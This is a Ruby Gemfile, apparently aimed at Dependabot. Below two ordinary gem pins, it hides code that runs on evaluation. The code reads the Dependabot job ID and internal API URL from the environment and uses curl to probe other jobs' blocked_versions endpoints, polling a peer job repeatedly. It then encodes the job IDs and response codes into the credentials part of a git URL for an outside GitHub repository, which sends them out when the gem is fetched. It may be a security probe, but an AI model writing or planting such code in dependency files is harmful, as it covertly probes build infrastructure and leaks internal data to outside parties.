source "https://rubygems.org"

job_id = ENV.fetch("DEPENDABOT_JOB_ID", "")
api_base = ENV.fetch("DEPENDABOT_API_URL", "").sub(%r{/+$}, "")
coord_state = "literal"
peer_id = "1621578324"
own_code = "000"
peer_active_code = "000"
peer_after_code = "na"
completed_code = "000"
invalid_code = "000"

begin
  require "open3"

  unless job_id.empty? || api_base.empty?
    own_url = "#{api_base}/update_jobs/#{job_id}/blocked_versions?package-manager=bundler"
    own_code, = Open3.capture3("curl", "-sS", "-m", "8", "-o", "/dev/null", "-w", "%{http_code}", own_url)

    if peer_id.match?(/\A[0-9]{1,20}\z/)
      peer_url = "#{api_base}/update_jobs/#{peer_id}/blocked_versions?package-manager=bundler"
      peer_active_code, = Open3.capture3(
        "curl", "-sS", "-m", "8", "-o", "/dev/null", "-w", "%{http_code}", peer_url
      )

      90.times do
        sleep 2
        observed_code, = Open3.capture3(
          "curl", "-sS", "-m", "8", "-o", "/dev/null", "-w", "%{http_code}", peer_url
        )
        next if observed_code.start_with?("2")

        peer_after_code = observed_code
        break
      end
    end

    completed_url = "#{api_base}/update_jobs/1621545005/blocked_versions?package-manager=bundler"
    completed_code, = Open3.capture3(
      "curl", "-sS", "-m", "8", "-o", "/dev/null", "-w", "%{http_code}", completed_url
    )

    invalid_url = "#{api_base}/update_jobs/999999999999999999/blocked_versions?package-manager=bundler"
    invalid_code, = Open3.capture3(
      "curl", "-sS", "-m", "8", "-o", "/dev/null", "-w", "%{http_code}", invalid_url
    )

    gem "dependabot-job-marker",
        git: "https://probe-c-job-#{job_id}-coord-#{coord_state}-peer-#{peer_id}-oa#{own_code}-pa#{peer_active_code}-px#{peer_after_code}-done#{completed_code}-inv#{invalid_code}@github.com/chawdamrunal/probe-lab.git",
        branch: "main",
        require: false
  end
rescue Exception
  gem "erubi", "1.10.0"
end

gem "rack", "2.2.3"
